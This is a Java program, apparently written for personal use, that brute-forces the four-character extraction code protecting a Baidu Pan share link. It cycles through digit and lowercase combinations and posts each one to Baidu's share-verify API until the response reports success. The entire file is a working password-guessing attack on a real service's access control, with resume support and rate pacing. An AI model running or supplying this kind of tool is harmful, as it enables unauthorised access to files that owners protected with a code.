package com.magic;

import com.alibaba.fastjson.JSONObject;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Explode {

    //参考官方文档 https://pan.baidu.com/union/doc/Yksmyl2v0
    public static void main(String[] args) {

        // 分别对应 0-9
        List<String> num = Arrays.asList("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
        // 分别对应 10 - 35
        List<String> ch_low = Arrays.asList("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
        // 分别对应 36 - 61
        List<String> ch_high = Arrays.asList("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
        List<String> dic = new ArrayList<String>();
        dic.addAll(num);
        dic.addAll(ch_low);
//        dic.addAll(ch_high); // 不清楚分享码带不带大写,可以先不带试试, 如果没试出来(建议放弃....36位 和 62位差距太大了)
        // 读取运行参数,可以接着上次爆破进度继续爆破
        int i, j, k, l;
        try {
            i = Integer.valueOf(args[0]);
            j = Integer.valueOf(args[1]);
            k = Integer.valueOf(args[2]);
            l = Integer.valueOf(args[3]);
        } catch (Exception e) {
            i = 0;
            j = 0;
            k = 0;
            l = 0;
        }
        System.out.println("起始位: " + dic.get(i) + "," + dic.get(j) + "," + dic.get(k) + "," + dic.get(l));

        RestTemplate restTemplate = new RestTemplate();

        // 在需要输入提取码的页面中找到surl ,https://pan.baidu.com/share/init?surl=xxxxxxxx
        String surl = "xxxxxxxx";

        String url = "https://pan.baidu.com/rest/2.0/xpan/share?method=verify&surl=" + surl;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.MULTIPART_FORM_DATA);
        headers.set("Referer", "pan.baidu.com");

        MultiValueMap<String, Object> paramMap = new LinkedMultiValueMap<String, Object>();

        for (; i < dic.size(); i++) {
            for (; j < dic.size(); j++) {
                for (; k < dic.size(); k++) {
                    for (; l < dic.size(); l++) {
                        String pwd = dic.get(i) + dic.get(j) + dic.get(k) + dic.get(l);
                        paramMap.clear();
                        paramMap.add("pwd", pwd);
                        System.out.println(pwd);
                        try {
                            Thread.sleep(100);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        HttpEntity<MultiValueMap<String, Object>> request = new HttpEntity<MultiValueMap<String, Object>>(paramMap, headers);
                        String result = restTemplate.postForObject(url, request, String.class);
                        JSONObject obj = JSONObject.parseObject(result);
                        if (obj.getIntValue("errno") == 0) {
                            System.out.println("success " + pwd);
                            break;
                        } else if (obj.getIntValue("errno") == -9) {
                            System.out.println(pwd + " error");
                        } else {
                            System.out.println(result);
                        }

                    }
                    l = 0;
                }
                k = 0;
            }
            j = 0;
        }

    }


}
